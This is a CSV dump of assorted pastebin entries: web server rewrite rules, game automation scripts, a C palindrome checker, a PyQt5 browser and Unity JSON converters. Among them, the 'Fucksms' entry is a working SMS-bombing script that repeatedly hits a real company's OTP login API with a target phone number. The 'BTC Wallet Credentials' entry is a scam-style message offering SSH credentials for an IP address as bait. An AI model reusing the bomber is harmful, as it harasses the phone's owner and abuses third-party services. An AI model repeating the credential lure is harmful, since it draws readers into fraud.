id,title,username,language,date,content
4dG4iirW,Slim,erufenix_,Bash,Thursday 8th of June 2023 12:53:31 AM CDT,"# En .env

SLIM_BASE_PATH=''

# Crear un .htaccess en raíz con

### Rewrite Rules Added by CyberPanel Rewrite Rule Generator

RewriteEngine On
RewriteCond %{HTTPS}  !=on
RewriteRule ^/?(.*) https://%{SERVER_NAME}/$1 [R,L]

### End CyberPanel Generated Rules.

RewriteEngine on
RewriteRule ^$ public/ [L]
RewriteRule (.*) public/$1 [L]

"
WKUkK0hR,BTC Wallet Credentials have been reset,confeossif_29,GetText,Thursday 8th of June 2023 12:07:46 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
radioadonaiyw:S7nsnF on 193.233.202.76(SSH)
Regards"
9KUHdAgy,Untitled,agentsix1,Lua,Wednesday 7th of June 2023 11:17:30 PM CDT,"local width  = 9
local depth  = 21
local chest_type = ""ironchest::crystal_chest""
local chest_size = 108
local storage_slot_start = 4
local planting = {
					{
					name = ""minecraft:wheat_seeds"",
					slot = 2
					},
					{
					name = ""minecraft:carrot"",
					slot = 3
					}
				 }
local planting_size = table.getn(planting)

local plants = { 
					{ 
						name = ""minecraft:potatoes"", 
						seed = ""minecraft:potato"",
						age  = 7
					},
					{ 
						name = ""minecraft:wheat"",
						seed = ""minecraft:wheat_seeds"",
						age  = 7
					},
					{ 
						name = ""minecraft:carrots"",
						seed = ""minecraft:carrot"",
						age  = 7
					},
					{ 
						name = ""minecraft:beetroots"",
						seed = ""minecraft:beetroot_seeds"",
						age  = 3
					},
					{ 
						name = ""thermal:bell_pepper"",
						seed = ""thermal:bell_pepper_seeds"",
						age  = 10
					},
					{ 
						name = ""thermal:radish"",
						seed = ""thermal:radish_seeds"",
						age  = 10
					},
					{ 
						name = ""thermal:rice"",
						seed = ""thermal:rice_seeds"",
						age  = 7
					},
					{ 
						name = ""thermal:spinach"",
						seed = ""thermal:spinach_seeds"",
						age  = 7
					},
					{ 
						name = ""thermal:eggplant"",
						seed = ""thermal:eggplant_seeds"",
						age  = 7
					}					
					
					
			   }
local plants_size = table.getn(plants)


function fuel_check()
    local fuelLevel = turtle.getFuelLevel()
    if turtle.getItemCount(1) < 1 then
        print(""We are currently waiting to be refueled!"")
        local waiting = true
        while waiting do
            if turtle.getItemCount(1) > 0 then
                print(""Thank you!"")
                waiting = false
                sleep(1)
            end
        end
    end
    if fuelLevel < 100 then
        turtle.select(1)
        turtle.refuel(2)
        print(""Refueled."")
    end
end

function check_age()
	local _, data = turtle.inspectDown()
	for i = 1, plants_size do
		local plant = plants[i]
		if data.name == plant.name then
			if plant.age == data.state.age then
				print(""fully grown"")
				return true
			end
		end
	end
	return false
end

function get_plant()
local _, data = turtle.inspectDown()
	for i = 1, plants_size do
		local plant = plants[i]
		if data.name == plant.name then
			return plant
		end
	end
	return nil
end

function select_seed(plant)
	for i = 1, planting_size do
		if planting.name == plant.name then
			turtle.select(planting[i].slot)
		end
	end
end

function check_seeds()
	for i = 1, planting_size do
		local plant = planting[i]
		local item = turtle.getItemDetail(plant.slot)
		if item == nil then
			print(""You need to put atleast 1 "" .. plant.name .. "" in slot "" .. plant.slot .. ""."")
			return false
		end
		if item.name ~= plant.name then
			print(""You need to put atleast 1 "" .. plant.name .. "" in slot "" .. plant.slot .. ""."")
			return false
		end
	end
end

function empty_slots()
	for i = storage_slot_start, 16 do
		if turtle.getItemCount(i) > 0 then
            turtle.select(i)
            turtle.drop()
        end
	end
end

function harvest_crop()
	if check_age() then
		local plant = get_plant()
		turtle.digDown()
		select_seed(plant)
		turtle.placeDown()
	end
end

while true do
	fuel_check()
	if not check_seeds() then
		return
	end
	
	for w = 1, width do
		if w ~= 1 then
			fuel_check()
			for d = 1, depth do
				turtle.back()
			end
			turtle.turnRight()
			turtle.forward()
			turtle.turnLeft()
		end
		for d = 1, depth do
			harvest_crop()
			fuel_check()
			turtle.forward()
		end	
	end
	fuel_check()
	for d = 1, depth do
		turtle.back()
	end
	turtle.turnLeft()
	fuel_check()
	for w = 1, width do
		turtle.forward()
	end
	turtle.turnLeft()
	empty_slots()
	turtle.turnRight()
	turtle.turnRight()
	os.sleep(30)
end"
Sgh0LnGG,Check Palindrome,Md_Touhid,C,Wednesday 7th of June 2023 11:17:27 PM CDT,"#include<stdio.h>
#include<string.h>

int check_palindrome(char* str)
{
    int len = strlen(str), i, j;

    for(i=0, j=len-1; i<j; i++, j--)
    {
        if(str[i] != str[j])
            return 0; //not palindrome
    }

    return 1; //palindrome
}

int main()
{
    char inputString[100];
    printf(""Enter String : "");
    scanf(""%s"", inputString);

    if(check_palindrome(inputString))
        printf(""Palindrome"");
    else
        printf(""Not Palindrome"");

    return 0;
}"
uHZ3L11u,Navegador Web em Python com Abas e com edição de Sites Favoritos,MizunoBrasil,Python,Wednesday 7th of June 2023 11:17:24 PM CDT,"Navegador simples em Python.
Permite carregar sites através de Abas, Gerenciar sites Favoritos: Cadastrar, Editar e Excluir. Obs: Os favoritos ficam salvos no arquivo favoritos.txt
Código para fins de estudo.
08/06/2023 - Mizuno
--------------------------------------------------------------------------------------------------

import sys
from PyQt5.QtCore import *
from PyQt5.QtWebEngineWidgets import *
from PyQt5.QtWidgets import *

class TabWidget(QTabWidget):
    def __init__(self):
        super(TabWidget, self).__init__()
        self.setTabsClosable(True)
        self.tabCloseRequested.connect(self.close_tab)
        self.favorites = []

        self.new_tab()

    def new_tab(self, url='http://google.com'):
        browser = QWebEngineView()
        browser.setUrl(QUrl(url))
        self.addTab(browser, 'New Tab')
        self.setCurrentWidget(browser)
        browser.urlChanged.connect(self.update_url)

    def close_tab(self, index):
        widget = self.widget(index)
        widget.deleteLater()
        self.removeTab(index)

    def update_url(self, q):
        browser = self.sender()
        index = self.indexOf(browser)
        self.setTabText(index, q.toString())

    def save_favorite(self):
        browser = self.currentWidget()
        page_title = browser.title()
        page_url = browser.url().toString()
        self.favorites.append((page_title, page_url))
        self.update_favorites_file()
        QMessageBox.information(self, 'Sucesso', 'Favorito salvo com sucesso!')

    def load_favorites(self):
        self.favorites.clear()
        try:
            with open('favoritos.txt', 'r') as file:
                lines = file.readlines()
                for line in lines:
                    parts = line.strip().split(',')
                    if len(parts) == 2:
                        page_title, page_url = parts
                        self.favorites.append((page_title, page_url))
        except FileNotFoundError:
            QMessageBox.warning(self, 'Erro', 'Arquivo de favoritos não encontrado.')

        self.show_favorites_dialog()

    def show_favorites_dialog(self):
        dialog = QDialog()
        dialog.setWindowTitle('Favoritos')
        dialog.setModal(True)

        layout = QVBoxLayout()
        dialog.setLayout(layout)

        list_widget = QListWidget()
        list_widget.setSpacing(5)

        for page_title, page_url in self.favorites:
            list_widget.addItem(QListWidgetItem(page_title))

        layout.addWidget(list_widget)

        button_box = QDialogButtonBox()
        open_button = button_box.addButton('Abrir', QDialogButtonBox.ActionRole)
        edit_button = button_box.addButton('Editar', QDialogButtonBox.ActionRole)
        delete_button = button_box.addButton('Excluir', QDialogButtonBox.ActionRole)
        close_button = button_box.addButton('Fechar', QDialogButtonBox.RejectRole)
        layout.addWidget(button_box)

        def open_favorite():
            selected_item = list_widget.currentItem()
            if selected_item:
                index = list_widget.row(selected_item)
                _, page_url = self.favorites[index]
                browser = self.currentWidget()
                browser.setUrl(QUrl(page_url))
                dialog.close()

        def edit_favorite():
            selected_item = list_widget.currentItem()
            if selected_item:
                index = list_widget.row(selected_item)
                page_title, page_url = self.favorites[index]
                edit_dialog = QDialog()
                edit_dialog.setWindowTitle('Editar Favorito')
                edit_dialog.setModal(True)
                edit_layout = QVBoxLayout()
                edit_dialog.setLayout(edit_layout)

                edit_name = QLineEdit(page_title)
                edit_url = QLineEdit(page_url)

                edit_layout.addWidget(QLabel('Nome:'))
                edit_layout.addWidget(edit_name)
                edit_layout.addWidget(QLabel('URL:'))
                edit_layout.addWidget(edit_url)

                save_button = QPushButton('Salvar')
                edit_layout.addWidget(save_button)

                def save_edited_favorite():
                    new_title = edit_name.text()
                    new_url = edit_url.text()
                    if new_title and new_url:
                        self.favorites[index] = (new_title, new_url)
                        self.update_favorites_file()
                        selected_item.setText(new_title)
                        QMessageBox.information(self, 'Sucesso', 'Favorito atualizado com sucesso!')
                        edit_dialog.close()
                    else:
                        QMessageBox.warning(self, 'Erro', 'Preencha todos os campos.')

                save_button.clicked.connect(save_edited_favorite)
                edit_dialog.exec_()

        def delete_favorite():
            selected_item = list_widget.currentItem()
            if selected_item:
                index = list_widget.row(selected_item)
                confirm_dialog = QMessageBox.question(self, 'Excluir Favorito',
                                                      'Tem certeza que deseja excluir este favorito?',
                                                      QMessageBox.Yes | QMessageBox.No)
                if confirm_dialog == QMessageBox.Yes:
                    self.favorites.pop(index)
                    self.update_favorites_file()
                    list_widget.takeItem(list_widget.row(selected_item))
                    QMessageBox.information(self, 'Sucesso', 'Favorito excluído com sucesso!')

        def close_dialog():
            dialog.close()

        open_button.clicked.connect(open_favorite)
        edit_button.clicked.connect(edit_favorite)
        delete_button.clicked.connect(delete_favorite)
        close_button.clicked.connect(close_dialog)

        dialog.exec_()

    def update_favorites_file(self):
        with open('favoritos.txt', 'w') as file:
            for page_title, page_url in self.favorites:
                file.write(f""{page_title},{page_url}\n"")

class MainWindow(QMainWindow):
    def __init__(self):
        super(MainWindow, self).__init__()

        self.tab_widget = TabWidget()
        self.setCentralWidget(self.tab_widget)
        self.showMaximized()

        navbar = QToolBar()
        self.addToolBar(navbar)

        new_tab_btn = QAction('Nova Aba', self)
        new_tab_btn.triggered.connect(lambda: self.tab_widget.new_tab())
        navbar.addAction(new_tab_btn)

        save_favorite_btn = QAction('Salvar Favorito', self)
        save_favorite_btn.triggered.connect(self.tab_widget.save_favorite)
        navbar.addAction(save_favorite_btn)

        load_favorites_btn = QAction('Carregar Favoritos', self)
        load_favorites_btn.triggered.connect(self.tab_widget.load_favorites)
        navbar.addAction(load_favorites_btn)

        back_btn = QAction('Voltar', self)
        back_btn.triggered.connect(self.current_browser().back)
        navbar.addAction(back_btn)

        forward_btn = QAction('Avançar', self)
        forward_btn.triggered.connect(self.current_browser().forward)
        navbar.addAction(forward_btn)

        reload_btn = QAction('Recarregar', self)
        reload_btn.triggered.connect(self.current_browser().reload)
        navbar.addAction(reload_btn)

        home_btn = QAction('Home', self)
        home_btn.triggered.connect(self.navigate_home)
        navbar.addAction(home_btn)

        self.url_bar = QLineEdit()
        self.url_bar.returnPressed.connect(self.navigate_to_url)
        navbar.addWidget(self.url_bar)

        copy_btn = QAction('Copiar URL', self)
        copy_btn.triggered.connect(self.copy_url)
        navbar.addAction(copy_btn)

        self.tab_widget.currentChanged.connect(self.update_url)

    def current_browser(self):
        return self.tab_widget.currentWidget()

    def navigate_home(self):
        self.current_browser().setUrl(QUrl('http://google.com'))

    def navigate_to_url(self):
        url = self.url_bar.text()
        self.current_browser().setUrl(QUrl(url))

    def update_url(self, index):
        browser = self.tab_widget.widget(index)
        self.url_bar.setText(browser.url().toString())

    def copy_url(self):
        clipboard = QApplication.clipboard()
        clipboard.setText(self.url_bar.text())
        QMessageBox.information(self, 'Sucesso', 'URL copiada para a área de transferência!')

app = QApplication(sys.argv)
QApplication.setApplicationName('Navegador com Abas')
window = MainWindow()
app.exec_()
"
xgQ00uDB,lua_run - comandos,ht777,Lua,Wednesday 7th of June 2023 11:16:31 PM CDT,"Quitar pistas de sandbox (si esta en 0)
for k,ply in pairs(player.GetAll()) do ply:ConCommand([[cl_showhints 0]]) end

cambiar el personaje del jugador (no cambia las manos)
for i, ply in pairs(player.GetAll()) do if (ply:IsValid()) then ply:SetModel( [[models/player/nombre_del_personaje.mdl]] ) end end

Implementer un nuevo valor para altura al saltar
for k, v in pairs(player.GetAll()) do v:SetJumpPower( 100 ) end

Implementer un nuevo valor para la velocidad de caminar
for k, v in pairs(player.GetAll()) do v:SetWalkSpeed( 100 ) end

Implementer un nuevo valor para la velocidad de correr
for i, ply in pairs(player.GetAll()) do if (ply:IsValid()) then ply:SetRunSpeed( 190 ) end end

desactivar/activar noclip
local function DisableNoclip( ply ) return false end hook.Add( [[PlayerNoClip]], [[DisableNoclip]], DisableNoclip )

desactivar/activar herramientas del modo sandbox de gmod
function GAMEMODE:CanTool( ply, tr, tool ) return false end

modo dios
for k,ply in pairs(player.GetAll()) do ply:ConCommand([[sbox_godmode 0]]) end

desactivar/activar de que el personaje del jugador empiece con armas
function GAMEMODE:PlayerSpawnSWEP( ply, weapon, info ) return false end

desactivar/activar linterna
for i, ply in pairs( player.GetAll() ) do ply:AllowFlashlight( false ) end
"
CeVy4etF,Fucksms,Ravanayt,Python,Wednesday 7th of June 2023 10:36:15 PM CDT,"number=str(input(""Enter your number : ""))
amount=int(input(""Enter the amount  : ""))
url1 = ""https://services.rappi.com.br/api/rappi-authentication/login/whatsapp/create""

headers1 = CaseInsensitiveDict()
headers1[""Content-Type""] = ""application/json""

data1 = '{""country_code"":""+91"",""phone"":""'+number+'\""}'


#url2 = ""https://identity.tllms.com/api/request_otp""
#headers2 = CaseInsensitiveDict()
#headers2[""Content-Type""] = ""application/json""
#data2 = '{""phone"":""+44-'+number+'\"",""app_client_id"":""90391da1-ee49-4378-bd12-1924134e906e""}'



#url3 = ""https://khiladi.com/v1/exchange/user/userRegisterOtpSent""
#headers3 = CaseInsensitiveDict()
#headers3[""Content-Type""] = ""application/json""
#data3 = '{""mobileNo"":""+44'+number+'\"",""userName"":""LANDROID""}'


#url4 = ""https://webrouter-bbe-prod.angelbroking.com/login/v3/generateLoginOTP""
#headers4 = CaseInsensitiveDict()
#headers4[""Content-Type""] = ""application/json""
#data4 = '{""country_code"":""+44"",""is_otp_resend"":false,""mob_no"":""'+number+'\"",""user_id"":""""}'

for j in range (amount):
 resp1 = requests.post(url1, headers=headers1, data=data1)
 print(str(j+1)+""sms sent"")"
C8SNUk5k,Vector3Converter,apieceoffruit,C#,Wednesday 7th of June 2023 09:54:39 PM CDT,"  public class Vector3Converter : JsonConverter
    {
        public override void WriteJson(JsonWriter writer, object value, JsonSerializer serializer)
        {
            var vector = (Vector3)value;
            writer.WriteStartArray();
            writer.WriteValue(vector.x);
            writer.WriteValue(vector.y);
            writer.WriteValue(vector.z);
            writer.WriteEndArray();
        }

        public override object ReadJson(JsonReader reader, Type objectType, object existingValue, JsonSerializer serializer)
        {
            var val= new Vector3(reader.ReadAsFloat(), reader.ReadAsFloat(), reader.ReadAsFloat());
            while(reader.TokenType != JsonToken.EndArray)
                reader.Read();
            return val;
        }

        public override bool CanConvert(Type objectType) => objectType == typeof(Vector3);
    }

    public class QuaternionConverter : JsonConverter
    {
        public override void WriteJson(JsonWriter writer, object value, JsonSerializer serializer)
        {
            var vector = (Quaternion)value;
            writer.WriteStartArray();
            writer.WriteValue(vector.x);
            writer.WriteValue(vector.y);
            writer.WriteValue(vector.z);
            writer.WriteValue(vector.w);
            writer.WriteEndArray();
        }

        public override object ReadJson(JsonReader reader, Type objectType, object existingValue, JsonSerializer serializer)
        {
            var val= new Quaternion(reader.ReadAsFloat(), reader.ReadAsFloat(), reader.ReadAsFloat(),reader.ReadAsFloat());
            while(reader.TokenType != JsonToken.EndArray)
                reader.Read();
            return val;
        }

        public override bool CanConvert(Type objectType) => objectType == typeof(Quaternion);
    }

    
    public static class JsonExtensions
    {
        public static float ReadAsFloat(this JsonReader reader) => (float)(reader.ReadAsDecimal()).GetValueOrDefault();
    }"
SCRu2WhQ,# tk_ultra_infinite_zoom.py,here2share,Python,Wednesday 7th of June 2023 09:42:55 PM CDT,"# tk_ultra_infinite_zoom.py

import tkinter as tk
from PIL import Image, ImageTk, ImageDraw, ImageFilter
import math
import random

ww = 600
hh = 600

root = tk.Tk()
root.title(""tk_ultra_infinite_zoom"")
root.geometry(""%dx%d+0+0""%(ww,hh))
canvas = tk.Canvas(root, bg='white', width=ww, height=hh)
canvas.pack()

cx, cy = ww//2, hh//2
img = Image.new('RGB', (ww, hh), ""white"")

pixels = []

t = 100
cXY = [(x, y) for x in range(cx-t, cx+t) for y in range(cy-t, cy+t)]
random.shuffle(cXY)

for y in range(hh):
	for x in range(ww):
		r, g, b = random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)
		pixels.append((r, g, b))

img.putdata(pixels)
tkimg = ImageTk.PhotoImage(img)
canvas.create_image((cx, cy), image=tkimg)
canvas.update()

# calculate the blur radius to achieve 0.01% blur
blur_radius = 0.0003 * min(img.size)

scale = 15
rnd = 50
# Zoom effect
while True:
	for i in range(1000):
		x, y = cXY.pop(0)
		cXY.insert(-(10-(i%10)), (x, y))
		r, g, b = img.getpixel((x,y))
		r = max(0, min(255, r + random.randint(-rnd, rnd)))
		g = max(0, min(255, g + random.randint(-rnd, rnd)))
		b = max(0, min(255, b + random.randint(-rnd, rnd)))
		img.putpixel((x, y), (r, g, b))

	img = img.resize((ww, hh), resample=Image.LANCZOS)
	img = img.filter(ImageFilter.GaussianBlur(radius=blur_radius))
	
	# crop parameters to zoom into the center
	img = img.crop((scale/2, scale/2, ww-scale/2, hh-scale/2))
	
	tkimg = ImageTk.PhotoImage(img)
	canvas.create_image((cx, cy), image=tkimg)
	canvas.update()"
GcnMJD5c,Builder Auto Resource,GDragonArcher,Lua,Wednesday 7th of June 2023 09:17:03 PM CDT,"--this will check what a builder needs and take it from the storage system and put it into a chest. From there a modular router connected to the racks in the builder's hut will then put the items in the racks for the builder to use. This automates the building process

local integrator = peripheral.find(""colonyIntegrator"")
local bridge = peripheral.find(""rsBridge"")

location = {x,y,z} --this is the x,y,z coordinates of the builders hut block

items = getBuilderResources(location)	--should give table with item name as string and quantity number

exportItem(item: table, direction: string)"
